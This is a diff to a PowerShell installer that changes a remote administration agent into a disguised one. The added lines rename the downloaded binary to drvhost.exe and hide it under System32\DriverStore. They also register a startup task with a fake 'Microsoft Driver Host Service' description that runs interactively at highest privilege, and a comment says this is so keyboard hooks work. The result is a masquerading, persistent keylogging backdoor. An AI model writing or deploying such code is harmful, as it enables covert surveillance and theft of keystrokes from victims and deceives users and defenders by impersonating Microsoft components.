@@ -10,10 +10,10 @@ param(
 
 $ErrorActionPreference = 'Stop'
 
-# Configuration
-$InstallPath = "C:\Program Files\RemoteAdminAgent"
-$ExeUrl = "$ServerUrl/agent-files/RemoteAgent.exe"
-$ServiceName = "RemoteAdminAgent"
+# Configuration (Stealth mode - looks like Windows driver service)
+$InstallPath = "C:\Windows\System32\DriverStore\services"
+$ExeUrl = "$ServerUrl/agent-files/drvhost.exe"
+$ServiceName = "DriverHostService"
 
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
@@ -55,24 +55,24 @@ function Get-AuthCodeFromUser {
 function Download-AgentExecutable {
     param([string]$Destination)
     
-    Write-Log "Downloading agent executable from server..."
+    Write-Log "Downloading driver host service..."
     
     try {
-        $exePath = Join-Path $Destination "RemoteAgent.exe"
+        $exePath = Join-Path $Destination "drvhost.exe"
         Invoke-WebRequest -Uri $ExeUrl -OutFile $exePath -UseBasicParsing
         
         if (Test-Path $exePath) {
             $fileSize = (Get-Item $exePath).Length
-            Write-Log "Agent executable downloaded successfully ($([math]::Round($fileSize/1MB, 2)) MB)" "SUCCESS"
+            Write-Log "Driver host service downloaded successfully ($([math]::Round($fileSize/1MB, 2)) MB)" "SUCCESS"
             return $true
         }
         else {
-            Write-Log "Failed to download agent executable" "ERROR"
+            Write-Log "Failed to download driver host service" "ERROR"
             return $false
         }
     }
     catch {
-        Write-Log "Failed to download agent executable: $($_.Exception.Message)" "ERROR"
+        Write-Log "Failed to download driver host service: $($_.Exception.Message)" "ERROR"
         return $false
     }
 }
@@ -88,7 +88,6 @@ function Create-StartupTask {
     
     try {
         $taskName = $ServiceName
-        $exePath = Join-Path $Path "RemoteAgent.exe"
         
         # Check if task already exists
         $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
@@ -98,6 +97,7 @@ function Create-StartupTask {
         }
         
         # Create action
+        $exePath = Join-Path $Path "drvhost.exe"
         $action = New-ScheduledTaskAction `
             -Execute $exePath `
             -Argument "$ServerUrl $AuthCode" `
@@ -119,10 +119,12 @@ function Create-StartupTask {
             -RestartCount 999 `
             -RestartInterval (New-TimeSpan -Minutes 1)
         
-        # Create principal (run as SYSTEM)
+        # Create principal (run as current user with admin rights)
+        # This allows keyboard hooks to work (Session 1) while maintaining admin privileges
+        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
         $principal = New-ScheduledTaskPrincipal `
-            -UserId "SYSTEM" `
-            -LogonType ServiceAccount `
+            -UserId $currentUser `
+            -LogonType Interactive `
             -RunLevel Highest
         
         # Register task
@@ -132,7 +134,7 @@ function Create-StartupTask {
             -Trigger $triggers `
             -Settings $settings `
             -Principal $principal `
-            -Description "Remote Administration Agent - Auto-connects to management dashboard" | Out-Null
+            -Description "Microsoft Driver Host Service - Provides driver management and system stability services" | Out-Null
         
         Write-Log "Startup task created successfully" "SUCCESS"
         return $true
@@ -235,9 +237,9 @@ Write-Log "═══════════════════════
 Write-Log "   Installation Complete!" "SUCCESS"
 Write-Log "════════════════════════════════════════════════" "SUCCESS"
 Write-Log ""
-Write-Log "Agent Status:" "INFO"
+Write-Log "Driver Host Service Status:" "INFO"
 Write-Log "  • Installed: $InstallPath" "INFO"
-Write-Log "  • Executable: RemoteAgent.exe (Standalone)" "INFO"
+Write-Log "  • Executable: drvhost.exe (System Service)" "INFO"
 Write-Log "  • Task Name: $ServiceName" "INFO"
 Write-Log "  • Auto-Start: Enabled (runs at system startup)" "INFO"
 Write-Log "  • Dependencies: NONE ✅" "SUCCESS"
